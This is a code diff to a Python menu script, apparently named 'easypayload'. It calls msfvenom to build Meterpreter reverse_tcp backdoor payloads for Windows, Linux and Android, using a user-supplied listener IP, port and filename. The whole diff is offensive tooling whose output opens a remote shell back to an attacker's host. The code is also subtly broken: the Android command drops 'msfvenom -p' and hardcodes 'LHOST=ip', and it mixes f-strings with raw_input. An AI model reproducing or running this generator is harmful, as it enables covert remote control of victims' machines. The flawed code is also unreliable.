@@ -13,11 +13,22 @@ class payload:
 	def windows():
 		op=raw_input('[1]reverse_tcp\n[2]back')
 		if op == '1':
-			os.system(f'msfvenom')
+			os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > output/{filename}.exe')
+		elif op == '2':
+			easypayload()
 	def linux():
+		op=raw_input('[1]reverse_tcp\n[2]back')
+		if op == '1':
+			os.system(f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > output/{filename}.elf')
+		elif op == '2':
+			easypayload()
 
 	def android():
-
+		op=raw_input('[1]reverse_tcp\n[2]back')
+		if op == '1':
+			os.system(f'android/meterpreter/reverse_tcp LHOST=ip R > output/{filename}.apk')
+		elif op == '2':
+			easypayload()
 
 
 def easypayload():
@@ -31,6 +42,7 @@ def easypayload():
 		ip=raw_input('IP:')
 		port=raw_input('Port:')
 		port=int(port)
+		filename=raw_input('Filename:')
 		generate()
 	elif option == '2':
 		listner()
